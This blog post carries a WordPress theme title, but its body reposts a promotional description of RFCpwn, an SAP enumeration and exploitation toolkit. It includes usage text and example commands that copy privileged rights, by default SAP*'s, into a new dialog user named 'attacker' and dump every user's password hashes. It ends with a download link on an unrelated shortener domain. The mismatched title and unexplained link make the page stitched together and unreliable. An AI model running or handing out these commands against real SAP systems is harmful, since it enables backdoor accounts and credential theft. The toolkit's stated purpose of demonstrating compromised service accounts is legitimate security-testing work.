---
title: 'Podium v1.1.2 – Fashion Model Agency WordPress Theme'
date: 2020-01-15T17:04:00+01:00
draft: false
---

**Kang Asu**

[![](https://1.bp.blogspot.com/-gwj2nNGIUuc/Xgz4gKswMVI/AAAAAAAARV0/Pj63ZwiwbaQxq9oPjPh6PqMPYaqZddEdQCNcBGAsYHQ/s640/RFCpwn_1.gif)](https://1.bp.blogspot.com/-gwj2nNGIUuc/Xgz4gKswMVI/AAAAAAAARV0/Pj63ZwiwbaQxq9oPjPh6PqMPYaqZddEdQCNcBGAsYHQ/s1600/RFCpwn_1.gif)

**RFCpwn - An Enumeration And Exploitation Toolkit Using RFC Calls To SAP**

  

  
An SAP [enumeration](https://www.kitploit.com/search/label/Enumeration "enumeration") and [exploitation](https://www.kitploit.com/search/label/Exploitation "exploitation")[toolkit](https://www.kitploit.com/search/label/Toolkit "toolkit") using SAP RFC calls  
This is a toolkit for demonstrating the impact of compromised service accounts.  
This PoC is not for use in production environments, no guarantee of stability or support.  
[](https://www.blogger.com/u/7/null)

[  
](https://www.blogger.com/u/7/null)

  

  
RFCpwn relies on the pyrfc and the libraries provided by SAP in: [https://github.com/SAP/PyRFC#installation](https://github.com/SAP/PyRFC#installation "https://github.com/SAP/PyRFC#installation")

```
usage: RFCpwn.py [-h] [-debug] [-ip IP] [-u Username] [-p Password]  
                   [-c Client] [-s Sysid] [-ping] [-enum] [-usercopy]  
                   [-user USER] [-copy COPY] [-pw PW] [-dump] [-exp]  
  
An [Impacket](https://www.kitploit.com/search/label/Impacket "Impacket") style enumeration and exploitation tool using SAP RFC calls  
  
optional arguments:  
  -h, --help   show this help message and exit  
  -debug       Turn DEBUG output ON  
  
Authentication:  
  -ip IP         
  -u Username  RFC Users Username  
  -p Password  RFC Users Password  
  -c Client    Client- eg.000  
  -s Sysid     System Number- eg 00  
  -ping        RFC Ping Command  
  
User Abuse:  
  -enum        Use to enumerate a specific user  
  -usercopy    add a Dialog User  
  -user USER   Required for -usercopy and -userenum to specify the user  
  -copy COPY   User to    be copied required for -usercopy  
  -pw PW       password of new user for -usercopy  
  
Hash Collection:  
  -dump        Dump hashes use with below  
  -exp         EXPERIMENTAL - Dump BCODE / PASSCODE hashes
```

  
**Examples**  
Ping - confirm connectivity

```
./RFCpwn.py -ip 192.168.200.253 -s 00 -c 000 -u RFCUser -p RFCPass -ping
```

Copy a users rights into a new dialog user. If -copy is not specified SAP\* is used.

```
./RFCpwn.py -ip 192.168.200.253 -s 00 -c 000 -u RFCUser -p RFCPass -usercopy -user attacker -pw changeme1
```

Dump hashes from all users. option -exp for experimental bcode & [passcode](https://www.kitploit.com/search/label/Passcode "passcode") hashes.

```
./RFCpwn.py -ip 192.168.200.253 -s 00 -c 000 -u RFCUser -p RFCPass -dump 
```

  
**Demo**

[![](https://1.bp.blogspot.com/-gwj2nNGIUuc/Xgz4gKswMVI/AAAAAAAARV0/Pj63ZwiwbaQxq9oPjPh6PqMPYaqZddEdQCNcBGAsYHQ/s640/RFCpwn_1.gif)](https://1.bp.blogspot.com/-gwj2nNGIUuc/Xgz4gKswMVI/AAAAAAAARV0/Pj63ZwiwbaQxq9oPjPh6PqMPYaqZddEdQCNcBGAsYHQ/s1600/RFCpwn_1.gif)

  

**[Download RFCpwn](http://ellevolaw.com/3jFi "Download RFCpwn")**

**Regards**

**Kang Asu**